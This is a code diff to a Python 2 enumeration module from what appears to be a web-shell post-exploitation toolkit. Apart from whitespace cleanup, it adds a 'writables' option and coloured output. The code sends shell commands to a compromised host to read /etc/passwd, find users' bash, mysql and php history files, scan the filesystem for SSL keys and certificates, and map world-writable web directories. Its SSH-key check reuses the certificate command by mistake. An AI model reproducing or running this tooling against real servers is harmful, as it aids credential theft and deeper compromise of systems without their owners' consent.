@@ -1,15 +1,17 @@
-from core.libs.request_handler import make_request
 from core.libs.menu import Colors
+from core.libs.request_handler import make_request
+from core.modules.shell_handler import linux
 
 
 class Enumerate(object):
-    def list(self):        
+    def list(self):
         print '\n[!] Usage: enum health\tTo get general info about the system'
         print '[!] Usage: enum history\tTo list \'intressing\' ~/.*-history files'
-        print '[!] Usage: enum ip\tTo get general networking info about the system'        
-        print '[!] Usage: enum keys\tTo get private SSH & SSL keys/certs'        
+        print '[!] Usage: enum ip\tTo get general networking info about the system'
+        print '[!] Usage: enum keys\tTo get private SSH & SSL keys/certs'
         print '[!] Usage: enum os\tTo get general operating system info about the system'
-        
+        print '[!] Usage: enum writables\tTo get all writable paths withing the document root'
+
     def health(self):
         cmd = 'input=`uptime` && if [[ \'$input\' == *day* ]] ; then echo $input | awk \'{print $3 ":" $5}\' | tr -d "," | awk -F ":" \'{print $1 " days, " $2 " hours and " $3 " minutes"}\'; else echo $input | awk \'{print $3}\' | tr -d "," | awk -F ":" \'{print $1 " hours and " $2 " minutes"}\'; fi;'
         cmd += "awk '{print ($1/(60*60*24))/($2/(60*60*24))*100 \"%\"}' /proc/uptime;"
@@ -36,8 +38,7 @@ class Enumerate(object):
         print '{0}[+] Listening TCP Services: {1} {2}'.format(Colors.GREEN, health[8], Colors.END)
         print '{0}[+] User Processors: {1} {2}'.format(Colors.GREEN, health[9], Colors.END)
         print '{0}[+] Total Processor: {1} {2}'.format(Colors.GREEN, health[10], Colors.END)
- 
- 
+
     def ip(self):
         cmd = "ip addr show | grep inet | awk '{printf \", \" $2}' | sed 's/^, *//' && echo;"
         cmd += "curl http://ifconfig.me/ip;"
@@ -45,36 +46,34 @@ class Enumerate(object):
         cmd += "/sbin/route -n | grep eth0 | awk '{print $2}' | grep -v 0.0.0.0 | head -n 1;"
         #grep -q "BOOTPROTO=dhcp" /etc/sysconfig/network-scripts/ifcfg-eth0 2>/dev/null
         #grep -q "inet dhcp" /etc/network/interfaces 2>/dev/null
-        cmd += 'dhcp_ip=`grep dhcp-server /var/lib/dhcp*/dhclient.* 2>/dev/null | uniq | awk \'{print $4}\' | tr -d ";"`; if [ $dhcp_ip ] ; then echo "Yes ($dhcp_ip)"; else echo "No"; fi;'  
-        
+        cmd += 'dhcp_ip=`grep dhcp-server /var/lib/dhcp*/dhclient.* 2>/dev/null | uniq | awk \'{print $4}\' | tr -d ";"`; if [ $dhcp_ip ] ; then echo "Yes ($dhcp_ip)"; else echo "No"; fi;'
+
         ip = make_request.get_page_source(cmd)
-        
+
         print '\n{0}[+] Internal IP/subnet: {1} {2}'.format(Colors.GREEN, ip[0], Colors.END)
-        print '{0}[+] External IP: {1} {2}'.format(Colors.GREEN, ip[1], Colors.END)        
-        print '{0}[+] DNS: {1} {2}'.format(Colors.GREEN, ip[2], Colors.END)        
-        print '{0}[+] Gateway (eth0): {1} {2}'.format(Colors.GREEN, ip[3], Colors.END)        
-        print '{0}[+] DHCP? : {1} {2}'.format(Colors.GREEN, ip[4], Colors.END)    
- 
- 
+        print '{0}[+] External IP: {1} {2}'.format(Colors.GREEN, ip[1], Colors.END)
+        print '{0}[+] DNS: {1} {2}'.format(Colors.GREEN, ip[2], Colors.END)
+        print '{0}[+] Gateway (eth0): {1} {2}'.format(Colors.GREEN, ip[3], Colors.END)
+        print '{0}[+] DHCP? : {1} {2}'.format(Colors.GREEN, ip[4], Colors.END)
+
     def os(self):
         cmd = "hostname;"
         cmd += "uname -a;"
         #cmd += "grep DISTRIB_DESCRIPTION /etc/*-release | head -n 1;"
-        cmd += "cat /etc/*-release | head -n 1;"        
+        cmd += "cat /etc/*-release | head -n 1;"
         cmd += "date;"
         cmd += "zdump UTC;"
         cmd += "echo $LANG;"
-        
+
         os = make_request.get_page_source(cmd)
-        
+
         print '\n{0}[+] Hostname: {1} {2}'.format(Colors.GREEN, os[0], Colors.END)
-        print '{0}[+] Kernel: {1} {2}'.format(Colors.GREEN, os[1], Colors.END)              
-        print '{0}[+] OS: {1} {2}'.format(Colors.GREEN, os[2], Colors.END)              
-        print '{0}[+] Time: {1} {2}'.format(Colors.GREEN, os[3], Colors.END)              
-        print '{0}[+] Timezone (UTC): {1} {2}'.format(Colors.GREEN, os[4], Colors.END)              
-        print '{0}[+] Language: {1} {2}'.format(Colors.GREEN, os[5], Colors.END)              
- 
- 
+        print '{0}[+] Kernel: {1} {2}'.format(Colors.GREEN, os[1], Colors.END)
+        print '{0}[+] OS: {1} {2}'.format(Colors.GREEN, os[2], Colors.END)
+        print '{0}[+] Time: {1} {2}'.format(Colors.GREEN, os[3], Colors.END)
+        print '{0}[+] Timezone (UTC): {1} {2}'.format(Colors.GREEN, os[4], Colors.END)
+        print '{0}[+] Language: {1} {2}'.format(Colors.GREEN, os[5], Colors.END)
+
     def keys(self):
         cmd = "find / -type f -print0 | xargs -0 -I '{}' bash -c 'openssl x509 -in {} -noout > /dev/null 2>&1; [[ $? == '0' ]] && echo \"{}\"'"
         self.ssl = make_request.get_page_source(cmd)
@@ -85,7 +84,7 @@ class Enumerate(object):
                 c += 1
         else:
             print '\n{0}[!]Can\'t find any SSL certs{1}'.format(Colors.RED, Colors.END)
-            
+
         cmd = "find / -type f -print0 | xargs -0 -I '{}' bash -c 'openssl x509 -in {} -noout > /dev/null 2>&1; [[ $? == '0' ]] && echo \"{}\"'"
         self.sshpub = make_request.get_page_source(cmd)
         if self.sshpub:
@@ -95,11 +94,10 @@ class Enumerate(object):
                 c += 1
         else:
             print '\n{0}[!]Can\'t find any public SSH keys{1}'.format(Colors.RED, Colors.END)
-        
+
         #Private keys
         #find / -type f -exec bash -c 'ssh-keygen -yf {} >/dev/null 2>&1' \; -exec bash -c 'echo {}' \;        #grep -r "SSH PRIVATE KEY FILE FORMAT" /{etc,home,root} 2> /dev/null | wc -l    # find / -name "*host_key*"
 
-        
     # a method to get all writable directories within CWD
     def writable(self):
         cmd = "find {0} -depth -perm -0002 -type d".format(linux.get_doc_root())
@@ -107,12 +105,11 @@ class Enumerate(object):
         if self.writables:
             c = 1
             for path in self.writables:
-                print '{0:2d}- {1}'.format(c, path)
+                print '{0}{1:2d}- {2}{3}'.format(Colors.GREEN, c, path, Colors.END)
                 c += 1
         else:
             print '\n{0}[!]Can\'t find any wriable directories{1}'.format(Colors.RED, Colors.END)
-			
-			
+
     def history(self):
         cmd = 'for i in $(cut -d: -f6 /etc/passwd | sort | uniq); do [ -f $i/.bash_history ] && echo "bash_history: $i"; [ -f $i/.nano_history ] && echo "nano_history: $i"; [ -f $i/.atftp_history ] && echo "atftp_history: $i"; [ -f $i/.mysql_history ] && echo "mysql_history: $i"; [ -f $i/.php_history ] && echo "php_history: $i";done'
         self.history = make_request.get_page_source(cmd)
